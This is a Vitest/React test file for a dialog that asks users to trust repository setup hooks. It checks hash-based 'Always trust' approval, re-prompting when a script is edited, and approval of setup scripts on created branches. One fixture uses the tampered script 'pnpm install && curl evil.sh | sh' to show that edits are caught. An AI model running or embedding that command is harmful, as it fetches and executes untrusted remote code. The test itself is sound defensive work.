// @vitest-environment happy-dom

import { act } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import OrcaYamlTrustDialog from './OrcaYamlTrustDialog'
import { useAppStore } from '@/store'
import {
  __resetTrustPromptChainForTests,
  confirmCreatedWorktreeSetupContent,
  ensureHooksConfirmed
} from '@/runtime/repo-hooks/ensure-hooks-confirmed'
import type { Repo } from '../../../../shared/repo-types'

const hooksCheck = vi.fn()
const uiSet = vi.fn<(updates: unknown) => Promise<void>>()

function makeRepo(executionHostId: Repo['executionHostId']): Repo {
  return {
    id: 'repo-1',
    path: '/repo',
    displayName: 'Repo One',
    badgeColor: '#000000',
    addedAt: 1,
    executionHostId
  }
}

let container: HTMLDivElement
let root: Root

beforeEach(() => {
  globalThis.IS_REACT_ACT_ENVIRONMENT = true
  hooksCheck.mockReset()
  uiSet.mockReset().mockResolvedValue(undefined)
  Object.assign(window, { api: { hooks: { check: hooksCheck }, ui: { set: uiSet } } })
  __resetTrustPromptChainForTests()
  useAppStore.setState({ trustedOrcaHooks: {}, activeModal: 'none', modalData: {} })
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
  act(() => {
    root.render(<OrcaYamlTrustDialog />)
  })
})

afterEach(() => {
  act(() => {
    root.unmount()
  })
  container.remove()
  document.body.innerHTML = ''
})

function serveSetupScript(script: string): void {
  hooksCheck.mockResolvedValue({
    hasHooks: true,
    hooks: { scripts: { setup: script } },
    mayNeedUpdate: false
  })
}

function confirmSetup(): Promise<'run' | 'skip'> {
  return ensureHooksConfirmed(() => useAppStore.getState(), 'repo-1', 'setup', 'local')
}

async function waitForPrompt(): Promise<void> {
  await vi.waitFor(() => {
    expect(useAppStore.getState().activeModal).toBe('confirm-orca-yaml-hooks')
    expect(document.body.querySelector('input[type="checkbox"]')).not.toBeNull()
  })
}

function clickButton(label: string): void {
  const button = Array.from(document.body.querySelectorAll('button')).find(
    (candidate) => candidate.textContent === label
  )
  expect(button).toBeDefined()
  act(() => {
    button?.click()
  })
}

async function approveWithAlwaysTrust(): Promise<void> {
  await waitForPrompt()
  act(() => {
    document.body.querySelector<HTMLInputElement>('input[type="checkbox"]')?.click()
  })
  clickButton('Run hooks')
}

describe('OrcaYamlTrustDialog Always trust', () => {
  it('keeps the approved script hash so a repo on two hosts stops prompting', async () => {
    useAppStore.setState({ repos: [makeRepo('local'), makeRepo('runtime:vm-1')] })
    serveSetupScript('pnpm install')

    const first = confirmSetup()
    await approveWithAlwaysTrust()
    await expect(first).resolves.toBe('run')

    expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
      all: { approvedAt: expect.any(Number) },
      setup: { contentHash: expect.any(String), approvedAt: expect.any(Number) }
    })
    expect(uiSet).toHaveBeenLastCalledWith({
      trustedOrcaHooks: useAppStore.getState().trustedOrcaHooks
    })

    await expect(confirmSetup()).resolves.toBe('run')
    expect(useAppStore.getState().activeModal).toBe('none')

    serveSetupScript('pnpm install && curl evil.sh | sh')
    const edited = confirmSetup()
    await waitForPrompt()
    expect(useAppStore.getState().modalData).toEqual(
      expect.objectContaining({ previouslyApproved: true })
    )
    clickButton("Don't run")
    await expect(edited).resolves.toBe('skip')
  })
})

describe('OrcaYamlTrustDialog created branch review', () => {
  it("saves a created branch's approved setup alongside the primary checkout's", async () => {
    useAppStore.setState({ repos: [makeRepo('local')] })
    serveSetupScript('pnpm install')
    const primary = confirmSetup()
    await waitForPrompt()
    clickButton('Run hooks')
    await expect(primary).resolves.toBe('run')
    const primaryHash = useAppStore.getState().trustedOrcaHooks['repo-1']?.setup?.contentHash

    const reviewBranch = (): ReturnType<typeof confirmCreatedWorktreeSetupContent> =>
      confirmCreatedWorktreeSetupContent(
        () => useAppStore.getState(),
        'repo-1',
        'pnpm install && pnpm build',
        'local'
      )
    const review = reviewBranch()
    await waitForPrompt()
    expect(document.body.textContent).toContain('pnpm install && pnpm build')
    clickButton('Run hooks')
    const approval = await review
    expect(approval.decision).toBe('run')

    expect(useAppStore.getState().trustedOrcaHooks['repo-1']?.setup).toEqual({
      contentHash: approval.approvedContentHash,
      approvedAt: expect.any(Number),
      previousContentHashes: [primaryHash]
    })
    // Neither the primary checkout's script nor the branch's prompts again.
    await expect(confirmSetup()).resolves.toBe('run')
    await expect(reviewBranch()).resolves.toEqual(approval)
    expect(useAppStore.getState().activeModal).toBe('none')
  })
})
